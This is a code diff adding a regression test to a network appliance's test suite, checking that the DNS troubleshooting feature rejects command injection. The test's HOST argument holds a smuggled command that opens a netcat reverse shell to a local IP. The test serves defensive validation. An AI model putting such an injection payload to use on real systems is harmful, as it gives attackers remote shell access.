@@ -2914,6 +2914,20 @@ server=dynupdate.no-ip.com
         global_functions.uvmContext.networkManager().setNetworkSettings(orig_netsettings)
         assert invalid_dns is False, "dns resolvers properly pinned to devices"
 
+    def test_710_runtroubleshoot_argument_exploit_test(self):
+        """
+        Verify argument exploit is not possible in runTroubleshooting functionality
+        """
+        # runTroubleshooting using arguments matching suspicious characters
+        execResult = global_functions.uvmContext.networkManager().runTroubleshooting("DNS", { "HOST": "1&nc 192.168.56.129:3333 -e /bin/bash" })
+        time.sleep(3)
+        assert(execResult == None)
+
+        # runTroubleshooting using valid arguments
+        execResult = global_functions.uvmContext.networkManager().runTroubleshooting("DNS", { "HOST": "amazon.com" })
+        time.sleep(3)
+        assert(execResult.getResult() == 0)
+
     @classmethod
     def final_extra_tear_down(cls):
         # Restore original settings to return to initial settings
